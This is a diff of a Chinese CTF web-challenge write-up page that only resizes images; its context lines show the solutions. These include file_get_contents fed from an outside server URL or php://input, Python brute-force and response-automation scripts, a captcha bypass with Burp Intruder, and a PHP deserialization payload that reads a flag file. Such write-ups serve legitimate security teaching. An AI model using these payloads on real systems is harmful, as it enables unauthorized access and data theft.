@@ -333,40 +333,40 @@
 <p>file_get_contents($b) 说明变量b应该是一个文件，在服务器上添加1.txt，构造变量b，使其满足条件</p>
 <p><a href="http://123.206.31.85:10001/?a=9&amp;b=http://129.211.106.169/1.txt，得到flag" target="_blank" rel="noopener">http://123.206.31.85:10001/?a=9&amp;b=http://129.211.106.169/1.txt，得到flag</a></p>
 <p>同样可以使用伪协议<a href="http://123.206.31.85:10001/?a=9&amp;b=php://input" target="_blank" rel="noopener">http://123.206.31.85:10001/?a=9&amp;b=php://input</a> ,post data 9,同样得到flag</p>
-<h3 id="三、web2"><a href="#三、web2" class="headerlink" title="三、web2"></a>三、web2</h3><div style="width:50%;margin:auto"><img src="/2020/09/23/ctf-web6/2.png" class></div>
+<h3 id="三、web2"><a href="#三、web2" class="headerlink" title="三、web2"></a>三、web2</h3><div style="width:70%;margin:auto"><img src="/2020/09/23/ctf-web6/2.png" class></div>
 
 <p>分析应该写一个python脚本</p>
 <p>找到运算的位置</p>
-<div style="width:50%;margin:auto"><img src="/2020/09/23/ctf-web6/3.png" class></div>
+<div style="width:70%;margin:auto"><img src="/2020/09/23/ctf-web6/3.png" class></div>
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://123.206.31.85:10002/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(url)</span><br><span class="line">res = r.content</span><br><span class="line">str1 = <span class="string">"&lt;br/&gt;"</span></span><br><span class="line">a = res.find(str1)</span><br><span class="line">b = res.find(<span class="string">"&lt;/p&gt;\n&lt;f"</span>)</span><br><span class="line">num=res[a+<span class="number">6</span>:b]</span><br><span class="line">r=s.post(url,data=&#123;<span class="string">'result'</span>:eval(num)&#125;)</span><br><span class="line">print(num)</span><br><span class="line"><span class="comment">#print(res)</span></span><br><span class="line">print(r.content)</span><br></pre></td></tr></table></figure>
 
 <p>得到flag,</p><p>flag{b37d6bdd7bb132c7c7f6072cd318697c}</p><p></p>
-<h3 id="四、web13"><a href="#四、web13" class="headerlink" title="四、web13"></a>四、web13</h3><div style="width:70%;margin:auto"><img src="/2020/09/23/ctf-web6/5.png" class></div>
+<h3 id="四、web13"><a href="#四、web13" class="headerlink" title="四、web13"></a>四、web13</h3><div style="width:80%;margin:auto"><img src="/2020/09/23/ctf-web6/5.png" class></div>
 
 <p>​    发现怎么输入都是wrong，没有sql注入点，于是用burp转包发现有password</p>
-<div style="width:70%;margin:auto"><img src="/2020/09/23/ctf-web6/4.png" class></div>
+<div style="width:80%;margin:auto"><img src="/2020/09/23/ctf-web6/4.png" class></div>
 
 <p>​    base64解密正好是flag但是不对，flag{a290df028e5279b0b749a285d3afc3b7}，将flag内容输入发现提示</p>
-<div style="width:70%;margin:auto"><img src="/2020/09/23/ctf-web6/6.png" class></div>
+<div style="width:80%;margin:auto"><img src="/2020/09/23/ctf-web6/6.png" class></div>
 
 <p>​    多次尝试，发现时间变化但一直需要faster，于是感觉需要写一个python代码来执行</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://123.206.31.85:10013/index.php'</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.post(url,data=&#123;<span class="string">'password'</span>: <span class="string">'111111'</span>&#125;)</span><br><span class="line"><span class="keyword">print</span>(r.headers)</span><br><span class="line">pwd = r.headers[<span class="string">'password'</span>]</span><br><span class="line"><span class="keyword">print</span>(pwd)</span><br><span class="line">_pwd = base64.b64decode(pwd)</span><br><span class="line"><span class="keyword">print</span>(_pwd)</span><br><span class="line">_pwd_ = _pwd[<span class="number">5</span>:len(_pwd)<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span>(_pwd_)</span><br><span class="line">r = s.post(url,data=&#123;<span class="string">'password'</span>: _pwd_&#125;)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br></pre></td></tr></table></figure>
 
 <p>拿到真正flag flag{FjXAkdGnOBoIUZaFzHqjInY2VndLSg}</p>
 <h3 id="五、web23"><a href="#五、web23" class="headerlink" title="五、web23"></a>五、web23</h3><p>打开网站，用御剑扫一下</p>
-<div style="width:70%;margin:auto"><img src="/2020/09/23/ctf-web6/7.png" class></div>
+<div style="width:80%;margin:auto"><img src="/2020/09/23/ctf-web6/7.png" class></div>
 
 <p>readme.txt中告诉了用户名是admin，密码是三位数</p>
-<div style="width:70%;margin:auto"><img src="/2020/09/23/ctf-web6/8.png" class></div>
+<div style="width:80%;margin:auto"><img src="/2020/09/23/ctf-web6/8.png" class></div>
 
 <p>其中1.png写出部分验证码是根据设置的SESSION，并是SESSION中的code与验证码图片里的数字比较</p>
-<div style="width:70%;margin:auto"><img src="/2020/09/23/ctf-web6/9.png" class></div>
+<div style="width:80%;margin:auto"><img src="/2020/09/23/ctf-web6/9.png" class></div>
 
 <p>那么就可以抓包将PHPSESSION中的值改为空，并同时将验证码&amp;verifycode值改为空，intruder暴力破</p>
-<div style="width:70%;margin:auto"><img src="/2020/09/23/ctf-web6/10.png" class></div>
+<div style="width:80%;margin:auto"><img src="/2020/09/23/ctf-web6/10.png" class></div>
 
-<div style="width:70%;margin:auto"><img src="/2020/09/23/ctf-web6/11.png" class></div>
+<div style="width:80%;margin:auto"><img src="/2020/09/23/ctf-web6/11.png" class></div>
 
 <p>得到flag</p>
 <h3 id="六、-web20"><a href="#六、-web20" class="headerlink" title="六、 web20"></a>六、 web20</h3><p>打开网站，内容如下</p>
@@ -374,17 +374,17 @@
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'utf-8'</span>) <span class="comment">#这三行是因为转换成字符串输出的时候出现了UnicodeEncodeError: 'ascii' codec can't encode characters in position ***问题，使用的是ulipad编译器。</span></span><br><span class="line">url = <span class="string">'http://123.206.31.85:10020/'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">30</span>): <span class="comment">#多找几次</span></span><br><span class="line">	s = requests.Session()</span><br><span class="line">	r = s.get(url)</span><br><span class="line">	res = r.content</span><br><span class="line">	str1 = <span class="string">"GET"</span></span><br><span class="line">	a = res.find(str1)</span><br><span class="line">	num=res[a<span class="number">-38</span>:a<span class="number">-5</span>]</span><br><span class="line">	print(num) <span class="comment">#找到字符密码位置</span></span><br><span class="line">	url2 = url + <span class="string">"?key="</span>+num</span><br><span class="line">	print(url2)</span><br><span class="line">	h = s.get(url2).text</span><br><span class="line">	f = open(<span class="string">'out.html'</span>, <span class="string">'a'</span>) <span class="comment">#因为网页及python的编码都是utf-8，在写入文件时Windows默认转码成gbk，遇到某些gbk不支持的字符就会报错。</span></span><br><span class="line">	f.write(h)</span><br></pre></td></tr></table></figure>
 
-<div style="width:70%;margin:auto"><img src="/2020/09/23/ctf-web6/12.png" class></div>
+<div style="width:80%;margin:auto"><img src="/2020/09/23/ctf-web6/12.png" class></div>
 
 <p>拿到flag</p>
 <h3 id="七、web11"><a href="#七、web11" class="headerlink" title="七、web11"></a>七、web11</h3><p>通过/robots.txt 拿到提示，shell.php，进入发现</p>
-<div style="width:70%;margin:auto"><img src="/2020/09/23/ctf-web6/13.png" class></div>
+<div style="width:80%;margin:auto"><img src="/2020/09/23/ctf-web6/13.png" class></div>
 
 <p>python爆破</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">'http://123.206.31.85:3030/shell.php'</span></span><br><span class="line">url2 =url</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s).hexdigest()</span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(url)</span><br><span class="line">res = r.content</span><br><span class="line">str1 = <span class="string">"6)"</span></span><br><span class="line">a = res.find(str1)</span><br><span class="line">num=res[a+<span class="number">5</span>:a+<span class="number">11</span>]</span><br><span class="line">print(num)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9999999</span>):</span><br><span class="line">    <span class="keyword">if</span> md5(str(i)).startswith(num):</span><br><span class="line">		url2 = url + <span class="string">"?password="</span>+str(i)</span><br><span class="line">print(url2)</span><br><span class="line">h = s.get(url2).text</span><br><span class="line">print(h)</span><br></pre></td></tr></table></figure>
 
 <h3 id="八、web21"><a href="#八、web21" class="headerlink" title="八、web21"></a>八、web21</h3><p>看到代码里面有file_get_contents，1.可以使用php://input来post值admin，2.可以使用user = http://服务器地址/1.txt其内容是admin传值，如同，并拿到class.php的代码，在拿到index.php代码。</p>
-<div style="width:70%;margin:auto"><img src="/2020/09/23/ctf-web6/14.png" class></div>
+<div style="width:80%;margin:auto"><img src="/2020/09/23/ctf-web6/14.png" class></div>
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure>
 
@@ -394,7 +394,7 @@
 
 <p>根据提示，我们要读取f1a9.php的内容，在index.php中echo $pass 当$pass是一个类的时候，可以调用__toString魔术方法，并将 $a-&gt;file = ‘f1a9.php’ 通过file_get_contents($this-&gt;file)直接读出flag，构造payload</p>
 <p>/?file=class.php&amp;user=php://input&amp;pass=O:4:”Read”:1:{s:4:”file”;s:8:”f1a9.php”;}</p>
-<div style="width:70%;margin:auto"><img src="/2020/09/23/ctf-web6/15.png" class></div>
+<div style="width:80%;margin:auto"><img src="/2020/09/23/ctf-web6/15.png" class></div>
 
 <p>flag{db2699f21f433a78</p>
 
